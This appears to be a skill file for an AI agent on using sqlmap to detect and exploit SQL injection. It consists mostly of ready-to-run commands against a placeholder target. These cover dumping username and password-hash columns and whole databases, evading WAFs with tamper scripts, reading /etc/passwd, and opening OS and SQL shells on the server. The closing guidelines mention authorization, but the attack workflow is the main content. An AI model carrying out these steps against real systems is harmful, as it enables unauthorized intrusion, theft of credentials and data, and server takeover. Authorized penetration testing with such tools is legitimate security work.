---
name: sqlmap
description: >-
  Detect and exploit SQL injection with sqlmap. Use when a user asks to test
  for SQL injection, extract database contents, bypass authentication via
  SQLi, automate injection testing, or dump database schemas.
license: Apache-2.0
compatibility: 'Linux, macOS, Windows (Python 3)'
metadata:
  author: terminal-skills
  version: 1.0.0
  category: devops
  tags:
    - sqlmap
    - sql-injection
    - penetration-testing
    - database
    - web-security
---

# sqlmap

## Overview

sqlmap automates SQL injection detection and exploitation. It supports all major databases (MySQL, PostgreSQL, MSSQL, Oracle, SQLite), all injection techniques (boolean-blind, time-blind, error-based, UNION, stacked queries), and can extract entire databases, read/write files on the server, and execute OS commands through SQL injection.

## Instructions

### Step 1: Basic Detection

```bash
# Test a URL parameter for SQL injection
sqlmap -u "https://target.example.com/products?id=1" --batch
# --batch: use defaults for all prompts (non-interactive)

# Test POST parameters
sqlmap -u "https://target.example.com/login" \
  --data="username=admin&password=test" \
  --batch

# Test with cookies and headers (authenticated sessions)
sqlmap -u "https://target.example.com/api/user?id=1" \
  --cookie="session=abc123" \
  --headers="Authorization: Bearer eyJ..." \
  --batch

# Specify which parameter to test
sqlmap -u "https://target.example.com/search?q=test&category=1&page=1" \
  -p "category" \
  --batch
```

### Step 2: Database Enumeration

```bash
# List all databases
sqlmap -u "https://target.example.com/products?id=1" --dbs --batch

# List tables in a database
sqlmap -u "https://target.example.com/products?id=1" \
  -D webapp_db --tables --batch

# List columns in a table
sqlmap -u "https://target.example.com/products?id=1" \
  -D webapp_db -T users --columns --batch

# Dump specific columns (e.g., credentials)
sqlmap -u "https://target.example.com/products?id=1" \
  -D webapp_db -T users -C "username,email,password_hash" --dump --batch

# Dump everything (use cautiously)
sqlmap -u "https://target.example.com/products?id=1" \
  -D webapp_db --dump-all --batch
```

### Step 3: Advanced Techniques

```bash
# Specify injection technique
sqlmap -u "https://target.example.com/products?id=1" \
  --technique=BT --batch
# B: Boolean-blind, T: Time-blind, E: Error-based
# U: UNION, S: Stacked queries, Q: Inline queries

# Tamper scripts for WAF bypass
sqlmap -u "https://target.example.com/products?id=1" \
  --tamper=space2comment,between,randomcase \
  --random-agent --batch
# space2comment: replaces spaces with /**/
# between: replaces > with NOT BETWEEN 0 AND
# randomcase: randomizes keyword case

# Test REST API JSON parameters
sqlmap -u "https://target.example.com/api/search" \
  --data='{"query":"test","limit":10}' \
  --content-type="application/json" \
  -p "query" --batch

# Level and risk increase (deeper testing)
sqlmap -u "https://target.example.com/products?id=1" \
  --level=5 --risk=3 --batch
# level 5: tests cookies, User-Agent, Referer, all params
# risk 3: includes heavy time-blind and OR-based tests
```

### Step 4: Post-Exploitation

```bash
# Read files from server (if DB user has FILE privilege)
sqlmap -u "https://target.example.com/products?id=1" \
  --file-read="/etc/passwd" --batch

# Get an OS shell (stacked queries + privileges needed)
sqlmap -u "https://target.example.com/products?id=1" \
  --os-shell --batch

# Get a SQL shell
sqlmap -u "https://target.example.com/products?id=1" \
  --sql-shell --batch

# Check current DB user and privileges
sqlmap -u "https://target.example.com/products?id=1" \
  --current-user --current-db --is-dba --batch
```

### Step 5: Crawl and Test Entire Application

```bash
# Crawl the site and test all found parameters
sqlmap -u "https://target.example.com/" \
  --crawl=3 --batch --forms
# --crawl=3: follow links up to depth 3
# --forms: test HTML form parameters too

# Use a Burp/ZAP request file
sqlmap -r captured-request.txt --batch
# captured-request.txt is a raw HTTP request file
```

## Guidelines

- **Always have written authorization.** SQL injection testing against unauthorized targets is illegal.
- Start with `--batch --level=1 --risk=1` (defaults). Increase level/risk only if needed.
- `--batch` mode is essential for automation — prevents interactive prompts.
- Time-blind injection is slow. Use `--threads=10` to speed up extraction.
- Tamper scripts bypass WAFs. Common: `space2comment`, `between`, `charencode`, `randomcase`.
- Use `-r request.txt` with Burp Suite exported requests for complex auth flows.
- `--dump` extracts data. In a real pentest, dump only what proves the vulnerability — not the entire database.
- sqlmap auto-detects the DBMS. Use `--dbms=mysql` to skip detection (faster).
